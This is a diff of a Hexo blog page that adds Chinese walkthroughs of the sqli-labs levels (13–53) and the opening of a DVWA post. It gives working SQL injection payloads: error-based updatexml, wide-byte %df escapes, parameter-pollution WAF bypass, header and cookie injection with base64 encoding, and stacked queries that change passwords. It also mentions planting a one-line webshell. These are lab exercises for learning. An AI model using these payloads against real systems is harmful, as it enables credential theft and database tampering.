@@ -71,10 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-less 46~53 order by注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/04/17/%E6%B5%8B%E8%AF%95/" class="article-date">
-  <time class="dt-published" datetime="2022-04-17T04:31:39.797Z" itemprop="datePublished">2022-04-17</time>
+    <a href="/2022/04/17/less%2046~53%20order%20by%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.627Z" itemprop="datePublished">2022-04-17</time>
 </a>
     
   </div>
@@ -83,12 +83,13 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>test</p>
+        <hr>
+<h2 id="title-less-46-53-order-by注入"><a href="#title-less-46-53-order-by注入" class="headerlink" title="title:less 46~53 order by注入"></a>title:less 46~53 order by注入</h2><p>SQL语法常识补充：where、having、group by、order by、limit的区别和使用顺序<br>where子句：<br>通过在SELECT语句的WHERE子句中指定条件进行查询，WHERE子句必须紧跟在FROM子句之后。<br>如：从员工表里查询员工id为h0001的员工的工资<br>select 工资 from 工资表 where id&#x3D;’h0001’;<br> having:<br>having一般与group by组合来使用，表示在得到分类汇总记录的基础之上，进一步筛选记录。<br>如：从部门表里查部门内员工薪水总和大于100000的部门的编号<br>select 部门编号,sum(薪水) from 部门表 group by 部门编号 having sum(薪水)&gt;100000;<br> 相同点：where和having都可以加条件<br>区别：1.where在分组之前加条件，having在分组之后加条件.<br>           2.where的效率要远远高于having. 分组本身消耗资源非常大.<br>GROUP BY：<br>当需要分组查询时需要使用GROUP BY子句，例如查询每个部门的工资和，这说明要使用部门来分组。<br>select 部门编号,sum(薪水) from 部门表 group by 部门编号;<br>ORDER BY：<br>order by 用来指定数据的排序方式。有升序和降序两种。desc表示降序，asc为升序，默认为升序，asc可省略。<br>order by 要写在where之后，limit之前。<br>select * from stu_info order by id asc;&#x2F;&#x2F; 按照id升序排序，其中asc可省略。<br>select * from stu_info order by id desc; &#x2F;&#x2F;按照id降序<br>LIMITE：<br>LIMIT用来限定查询结果的起始行，以及总行数。<br>如：查询10行记录，起始行从3开始<br>select * from emp limit 3,10;<br>——————————<br>这一题的注入点在于order by后面的数字是一个可控的参数，我们可以利用这个来构造我们的语句，使其被数据库执行。<br>那么报错注入，联合注入，时间盲注我们要选择哪一个？<br>由于使用orderby语句我们没有办法使用union查询，这里使用报错注入<br>查库：？sort&#x3D;1 and updatexml(1,concat(0x7e,(database()),0x7e),1)–+<br>表：？sort&#x3D;1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)–+<br>列：？sort&#x3D;1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’),0x7e),1)–+<br>字段：？sort&#x3D;1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(‘~’,username,password)) from security.users),0x7e),1)–+<br>——————————<br>尝试之后我们可以写入一句话木马，然后用蚁剑连接。<br>——————————<br>less 47从数字型改为加个单引号闭合<br>less 48无报错，使用时间盲注<br>less 50使用数字型堆叠注入<br>less 51使用单引号闭合堆叠注入<br>less 52、53基本一样</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/17/%E6%B5%8B%E8%AF%95/" data-id="cl22sstfm0000o4vj7yzj3vm8" data-title="" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/17/less%2046~53%20order%20by%E6%B3%A8%E5%85%A5/" data-id="cl22vvyy80007l4vje1iu6l1l" data-title="" class="article-share-link">Share</a>
       
       
       
@@ -100,10 +101,222 @@
 
 
   
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-less 38~42" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/04/17/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2022-04-17T04:13:51.079Z" itemprop="datePublished">2022-04-17</time>
+    <a href="/2022/04/17/less%2038~42/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.624Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-less-38-42"><a href="#title-less-38-42" class="headerlink" title="title:less 38~42"></a>title:less 38~42</h2><p>这一关用了堆叠注入，什么是堆叠注入？<br>堆叠注入原理<br>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如<br> select * from users;show databases;<br>就同时执行以上两条命令，所以我们可以增删改查，只要权限够.<br>这里补偿几个SQL连接的不同语法：<br>mysqli_connect()函数；mysqli_select_db（）；mysqli_multi_query()；mysql_store_result()函数<br>mysqli_more_results()；<br>这里是由于使用的是mysql_multi_query() 函数，mysql_multi_query() 支持多条sql语句同时执行。<br>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，<br>但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，<br>将可能对网站造成十分大的威胁。而且使用堆叠注入的时候往往不会回显，无法在页面查看返回结果，同时在使用堆叠注入之前，我们也需要一些数据库的相关信息。<br>使用堆叠注入和普通注入的最大差别是可以使用任意的SQL语句，不仅仅局限于查找，还可以实现增删查改。<br>例如，我们尝试修改用户dumb的密码可以使用语句：？id&#x3D;1’;updata users set password&#x3D;’12345’where username&#x3D;’dumb’;–+<br>新增一个用户：？id&#x3D;1’；insert users values(22,’用户名’,’密码’) 	查询第22个id可以看到新建的用户账号和密码。<br>——————<br>其他的在闭合方式做一些处理即可。less 42是post的请求方式，我们先通过burpsuit进行抓包再注入。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/less%2038~42/" data-id="cl22vvyy70006l4vj6uez5eh4" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-LESS 32~37" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/LESS%2032~37/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.620Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-less-32-37，转义编码"><a href="#title-less-32-37，转义编码" class="headerlink" title="title:less 32~37，转义编码"></a>title:less 32~37，转义编码</h2><p>这里考察的是宽字节注入<br>宽字节注入原理即是利用编码转换，将服务器端强制添加的本来用于转义的\符号吃掉，<br>从而能使攻击者输入的引号起到闭合作用，以至于可以进行SQL注入。<br>涉及到的基本概念<br>字符、字符集<br>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。<br>UTF8<br>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。<br>宽字节<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。<br>1.MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;<br>2.进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：<br>使用每个数据字段的CHARACTER SET设定值;<br>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);<br>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;<br>若上述值不存在，则使用character_set_server设定值。<br>将操作结果从内部操作字符集转换为character_set_results。<br>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。<br>宽字节注入原理：<br>GBK 占用两字节<br>ASCII占用一字节<br>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。<br>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ &#x3D;%df%5c%27，<br>如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。<br>宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为&#39;，<br>其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击<br>————————<br>从源码，可以看出，单双引号以及右划线被\注释掉了，GBK的中文编码及符号是双字节来表示的，英文编码是用ASCII码表示的，即用单字节表示。所以我们可以利用宽字节的方式用%df或%aa与\结合成一个字节（繁体汉字），从而剔除掉\的影响。<br>payload：<br>?id&#x3D;-1%df%27 union select 1,2,3–+<br>数据库名：?id&#x3D;-1%df%27 union select 1,database(),3 –+<br>由于union查询语句‘security’需要用单引号，而单引号会被注释掉，所以这里将security转换为十六进制表达<br>数据表：?id&#x3D;-1%df%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;database()–+<br>或者是：?id&#x3D;-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x7365637572697479–+<br>列名：?id&#x3D;-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;0x7573657273 and table_schema&#x3D;0x7365637572697479–+<br>数据：?id&#x3D;-1%df%27 union select 1,group_concat(username,0x7e,password),3 from users–+<br>——————<br>less 33基本一样<br>——————<br>less34注意点<br>在这里我想在区分一下在啊url输入和在下面框里输入的区别：<br>get和post提交方式的区别会对%进行编码，如果直接在url输入的话%正常上传，如果你用post的方式提交的话，%会被编码成%25，这样就会出现问题。<br>解决方法是通过burpsuit进行抓包，然后将多编码的25删掉之后再发送就可以了。<br>补充一个方法：我们可以将 UTF-8 的’转换为 UTF-16 的�’，例如：id&#x3D;a�’ union select 1,2–+</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/LESS%2032~37/" data-id="cl22vvyxy0000l4vj38rl2gi7" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-less 29~31" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/less%2029~31/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.616Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-less-29-31"><a href="#title-less-29-31" class="headerlink" title="title:less 29~31"></a>title:less 29~31</h2><p>less29类似于架构了一个firewall，通过以tomcat为引擎的jsp服务器对输入的id进行筛选，再传给以apache为引擎的PHP服务器。<br>服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。<br>工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。<br>&#x2F;&#x2F;WAF implimentation with a whitelist approach….. only allows input to be Numeric.<br>&#x2F;&#x2F;只允许数字型数字<br>function whitelist($input)<br>{<br>    $match &#x3D; preg_match(“&#x2F;^\d+$&#x2F;“, $input);<br>    &#x2F;&#x2F;  正则表达式：&#x2F;^\d+$&#x2F;<br>    &#x2F;&#x2F;  ^匹配输入字符串的开始位置。<br>    &#x2F;&#x2F;  \d任意一个数字，0~9 中的任意一个[0-9]<br>    &#x2F;&#x2F; +修饰匹配次数为至少 1 次。<br>    &#x2F;&#x2F; $匹配输入字符串的结尾位置</p>
+<pre><code>if($match)//如果匹配，用户输入了数字的话，就允许继续
+&#123;
+    //echo &quot;you are good&quot;;
+    //return $match;
+&#125;
+else
+&#123;   
+    header(&#39;Location: hacked.php&#39;);//重定向
+    //echo &quot;you are bad&quot;;
+&#125;
+</code></pre>
+<p>}</p>
+<p>&#x2F;&#x2F; The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</p>
+<p>function java_implimentation($query_string)<br>{<br>    $q_s &#x3D; $query_string;<br>    $qs_array&#x3D; explode(“&amp;”,$q_s);<br>&#x2F;&#x2F;  explode()作用:把字符串打散为数组<br>&#x2F;&#x2F;如果输入一个?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3，就会分割成{id&#x3D;1,id&#x3D;2,id&#x3D;3}这样的数组</p>
+<pre><code>foreach($qs_array as $key =&gt; $value)
+&#123;
+    $val=substr($value,0,2);//截断字符id=1，取前面id
+    if($val==&quot;id&quot;)
+    &#123;
+        $id_value=substr($value,3,30); //取id后面的数字
+        return $id_value;
+
+        break;
+    &#125;
+
+&#125;
+</code></pre>
+<p>}<br>利用Java_implimentation方法的漏洞，当我们输入多个id并且用&amp;隔开时，这个方法只会对第一个id的值进行检验，<br>这时我们可以在后面的id值里面进行注入，绕过他的防火墙。<br>所以我们可以构建payload：?id&#x3D;1&amp;id&#x3D; ‘union select 1,2,database() –+<br>接下来正常注入就可以。<br>——————————<br>less 30的闭合方式改为“<br>——————————<br>less 31的闭合方式改为”）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/less%2029~31/" data-id="cl22vvyy70005l4vj4v7tdzs6" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-less 18~22" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/less%2018~22/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.612Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-less-18-22"><a href="#title-less-18-22" class="headerlink" title="title:less 18~22"></a>title:less 18~22</h2><p>常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】；<br>(1)HTTPReferer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。<br>(2)X-Forwarded-For:简称XFF头，它代表客户端，用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中<br>(3)Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）<br>(4)X-Real-IP一般只记录真实发出请求的客户端IP<br>检查源码发现对username和password的输入都进行了过滤，没办法直接注入<br>发现useragent和ip的值也可以插入到数据库中，利用这个进行注入。<br>但是在进入处理user—agent部分至强要先输入正确的账号和密码才能绕过账号密码判断（与现实中常规的注入先注册登录再注入比较贴合）<br>那么我们先通过burosuit抓包<br>修改user-agent的值<br>user-agent：数据库名1’,1,updatexml(1,concat(0x3a,database(),0x3a),1))#<br>user-agent：表名1’,1,updatexml(1,concat(0x3a,(selecttable_namefrominformation_schema.tableswheretable_schema&#x3D;’security’limit0,1),0x3a),1))#<br>user-agent：字段名’orupdatexml(1,concat(‘#’,(selectgroup_concat(column_name)frominformation_schema.columnswheretable_schema&#x3D;’security’andtable_name&#x3D;’users’)),0),’’,’’)#<br>user-agent：字段内容’orupdatexml(1,(concat(0x3a,(selectusernamefromsecurity.userslimit0,1),0x3a)),1)and’1’&#x3D;’1<br>————<br>less 19为refer注入，修改refer处的值就可以了</p>
+<hr>
+<p>less 20 一样通过burpsuit抓包，修改cookie的值<br>数据库名Cookie:uname&#x3D;1’unionselect1,2,database()#<br>数据表Cookie:uname&#x3D;1’unionselect1,2,(selecttable_namefrominformation_schema.tableswheretable_schema&#x3D;’security’limit3,1)#<br>列名Cookie:uname&#x3D;1’unionselect1,2,group_concat(column_name)frominformation_schema.columnswheretable_schema&#x3D;’security’andtable_name&#x3D;’users’#<br>字段内容Cookie:uname&#x3D;1’unionselect1,2,group_concat(concat_ws(‘-‘,id,username,password))fromusers#<br>————<br>less 21对cookie的值进行了base64加密，因此我们的注入语句也要进行base64加密，<br>正常语句写完之后转换为base编码（encode）<br>判断回显位’)unionselect1,2,3#JykgdW5pb24gc2VsZWN0IDEsMiwzIw&#x3D;&#x3D;<br>数据库’)unionselect1,2,(selectgroup_concat(schema_name)frominformation_schema.schemata)#JykgdW5pb24gc2VsZWN0IDEsMiwoc2VsZWN0IGdyb3VwX2NvbmNhdChzY2hlbWFfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEpIw&#x3D;&#x3D;<br>数据表’)unionselect1,(selecttable_namefrominformation_schema.tableswheretable_schema&#x3D;’security’limit0,1),3#JykgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCB0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyBsaW1pdCAwLDEpLDMj<br>列名’)unionselect1,2,(selectgroup_concat(column_name)frominformation_schema.columnswheretable_name&#x3D;’users’)#JykgdW5pb24gc2VsZWN0IDEsMiwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSd1c2VycycpIw&#x3D;&#x3D;<br>字段’)unionselect1,(selectgroup_concat(username)fromusers),(selectgroup_concat(password)fromusers)#JykgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUpIGZyb20gdXNlcnMpLChzZWxlY3QgZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSBmcm9tIHVzZXJzKSM&#x3D;<br>————<br>less 22闭合方式改为双引号，其他与less21一样</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/less%2018~22/" data-id="cl22vvyy60004l4vj5e6c1o90" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-less 17 check_input的过滤" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/less%2017%20check_input%E7%9A%84%E8%BF%87%E6%BB%A4/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.608Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-less-17，check-input的过滤"><a href="#title-less-17，check-input的过滤" class="headerlink" title="title:less 17，check_input的过滤"></a>title:less 17，check_input的过滤</h2><p>这题比较不一样，查看源代码发现对username的输入用check_input函数进行了过滤，使得我们不能在username的位置进行注入<br>通过代码查看这里check_input函数，一共有三个限制，首先是限制了输入的字符长度<br>然后是get_magic_quotes_gpc函数介绍：（使得我们在账号一栏输入的闭合失效）<br>取得 PHP 环境变数 magic_quotes_gpc 的值，属于 PHP 系统功能。<br>语法: long get_magic_quotes_gpc(void);<br>返回值: 长整数<br>本函数取得 PHP 环境配置的变量 magic_quotes_gpc (GPC, Get&#x2F;Post&#x2F;Cookie) 值。返回 0 表示关闭本功能；返回 1 表示本功能打开。<br>当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转为含有反斜线的溢出字符。<br>magic_quotes_gpc设置是否自动为GPC(get,post,cookie)传来的数据中的’”加上反斜线。可以用get_magic_quotes_gpc()检测系统设置。<br>如果没有打开这项设置，可以使用addslashes()函数添加，它的功能就是给数据库查询语句等的需要在某些字符前加上了反斜线。<br>这些字符是单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）。<br>默认情况下，PHP 指令 magic_quotes_gpc 为 on，它主要是对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。<br>不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测<br>但是发现并没有对password的输入进行限制，因此我们可以在password的位置进行注入，uname的值可以为admin<br>————————<br>1）addslashes()作用及使用<br>addslashes()通常用于防止sql注入，它可对通过get，post和cookie传递过来的参数的单引号和双引号已经null前加“\”进行转义<br>如：如变量$str&#x3D;$_POST[“str”];的值为：bb’ or 1&#x3D;’1。通过addslashes()函数过滤后会变为：bb&#39; or 1&#x3D;&#39;1；<br>————————<br>php stripslashes()函数功能：<br>addslashes的反向操作，移除addslashes()函数添加的转义反斜杠字符。<br>二、函数语法：string stripslashes($str)<br>三、函数参数：参数描述<br>$str要移除转义反斜杠的字符串。<br>四、返回值：返回移除转义反斜杠后的字符串<br>————————<br>ctype_digit()函数<br>ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE<br>————————<br>substr()函数<br>一、参数：(pos, n)<br>pos - 从此位置开始拷贝<br>n - 拷贝 n 长度的字符串<br>二、形式：<br>s.substr(pos, n)<br> 三、解释：<br>返回一个string，包含s中从pos开始的n个字符的拷贝。<br>例子：string s&#x3D;”123abc”;<br>  string a&#x3D;s.substr(2,2);&#x2F;&#x2F;从下标为2的位置开始，拷贝两个字符返回。<br>————————<br>mysql_real_escape_string和addslashes的区别在于：</p>
+<p>区别一：addslashes不知道任何有关MySQL连接的字符集。如果你给所使用的MySQL连接传递一个包含字节编码之外的其他编码的字符串，<br>它会很愉快地把所有值为字符‘、“、\和\x00的字节进行转义。如果你正在使用不同于8位和UTF-8的其它字符，这些字节的值不一定全部都是表示字符‘、“、\和\x00。<br>可能造成的结果是，MySQL接收这些字符后出现错误。<br>区别二：<br>与addslashes对比，mysql_real_escape_string同时还对\r、\n和\x1a进行转义。这些字符必须正确地告诉MySQL，否则会得到错误的查询结果。<br>————————<br>这里采用updatexml()报错注入：<br>首先了解下updatexml()函数</p>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>查版本：uname&#x3D;admin&amp;passwd&#x3D;1’and(updatexml(1,concat(0x5c,version(),0x5c),1))#submit&#x3D;submit<br>查库名：uname&#x3D;admin&amp;passwd&#x3D;1’and(updatexml(1,concat(0x5c,database(),0x5c),1))#submit&#x3D;submit<br>查表名：uname&#x3D;admin&amp;passwd&#x3D;1’and(updatexml(1,concat(0x5c,(selecttable_namefrominformation_schema.tableswheretable_schema&#x3D;’security’limit3,1),0x5c),1))#submit&#x3D;submit<br>查字段名：uname&#x3D;admin&amp;passwd&#x3D;1’and(updatexml(1,concat(0x5c,(selectpasswordfrom(selectpasswordfromuserswhereusername&#x3D;’admin’)aa),0x5c),1))#submit&#x3D;submi</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/less%2017%20check_input%E7%9A%84%E8%BF%87%E6%BB%A4/" data-id="cl22vvyy60003l4vj4cxlamts" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-less 13 post类型盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/less%2013%20post%E7%B1%BB%E5%9E%8B%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.605Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-less-13、14详解"><a href="#title-less-13、14详解" class="headerlink" title="title:less 13、14详解"></a>title:less 13、14详解</h2><p>该题为post类型盲注，没有回显但是由于页面会显示是否成功登录，因此我<br>门可以采用布尔类型盲注。（也可以用时间盲注）<br>当payload为：uname&#x3D;’) or 1&#x3D;1#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit时显示登录成功，闭合类型为’)单引号括号闭合<br>接下来的语句和get类型的基本一样<br>————<br>less14 的闭合类型为”双引号闭合<br>————<br>less15为单引号闭合，less15采用时间盲注</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/less%2013%20post%E7%B1%BB%E5%9E%8B%E7%9B%B2%E6%B3%A8/" data-id="cl22vvyy50002l4vj5eus3ak1" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-DVWA" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/DVWA/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.593Z" itemprop="datePublished">2022-04-17</time>
 </a>
     
   </div>
@@ -114,7 +327,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/04/17/hello-world/">Hello World</a>
+      <a class="p-name article-title" href="/2022/04/17/DVWA/">DVWA靶场</a>
     </h1>
   
 
@@ -122,24 +335,125 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <p>BRUTE FORCE<br>low等级可以直接使用burtsuit工具的暴力破解，我们需要一个好用的字典。<br>medium等级的防护也没有用。<br>但是high等级我们发现这里存在一个token验证，我们就要改变burtsuit的攻击模式了。<br>知识补充：关于session、cookie、token<br><a target="_blank" rel="noopener" 